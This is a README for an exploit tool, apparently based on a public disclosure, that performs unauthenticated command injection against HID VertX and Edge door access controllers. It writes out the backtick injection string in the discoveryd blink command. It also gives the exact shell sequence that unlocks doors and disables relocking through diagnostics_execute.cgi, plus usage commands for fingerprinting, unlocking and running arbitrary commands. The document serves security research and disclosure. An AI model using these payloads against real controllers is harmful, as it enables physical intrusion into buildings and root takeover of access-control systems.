# VertXploit
Command Injection on HID VertX and Edge Door Controllers

## Summary ##
Originally disclosed by Ricky "HeadlessZeke" Lawshae of Trend Micro DVLabs

This vulnerability allows remote attackers to execute arbitrary code on VertX, Edge, and EVO HID access control panels. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the discoveryd service. The issue lies in the failure to sanitize user data before executing a system call. An attacker could leverage this vulnerability to execute code with root privileges.

The actual location of the command injection is in the `command_blink_on` command. Normally, the command string would terminate with the number of times the VertX controller light should blink, in this case 30 times. 

`command_blink_on;042;<MAC_ADDRESS>;30;`

By replacing the number of blinks with a Linux command and wrapping it in back ticks, the command will get executed by the controller.

``command_blink_on;042;<MAC_ADDRESS>;`ping -c 5 192.168.0.39`;``

## Usage ##
The only requirement is the IP address of an un-patched HID VertX door controller. The device itself uses UDP port 4070 by default.

Running the script without specifying a raw payload, `--raw`, or action, `--action`, will attempt to fingerprint the VertX controller and return version information.

To remotely unlock and lock doors connected to the VertX controller commands are echoed to `/tmp/a`. This is done because there is a length limit of how many characters can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>

Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`. The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` for sending the unlock and lock the commands to the VertX controller

### Unlock ###
	# Set QUERY_STRING to the door unlock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=1"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Remove executable permissions to prevent the door from locking
	chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

### Lock ###
	# Enable executable permissions
	chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Set QUERY_STRING to the door lock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=0"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi

### Raw Payload ###
Depending on what payload is being sent, the VertX system may not be able to execute the command because it is not installed (i.e. Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX models tested.


## Examples ##

###### Fingerprint a VertX controller

`python vertXploit.py -i 192.168.0.5`

###### Unlock doors connected to the VertX controller

`python vertXploit.py -i 192.168.0.5 --action unlock`

###### Lock doors connected to the VertX controller

`python vertXploit.py -i 192.168.0.5 --action lock`

###### Execute the command 'ping -c 5 192.168.0.39'

`python vertXploit.py -i 192.168.0.5 ping -c 5 192.168.0.39`


## Resources ##
* HeadlessZeke - https://github.com/headlesszeke/defcon24-demos
* TrendMicro Blog - http://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/
* ZDI - http://www.zerodayinitiative.com/advisories/ZDI-16-223/
* Other Work - http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html
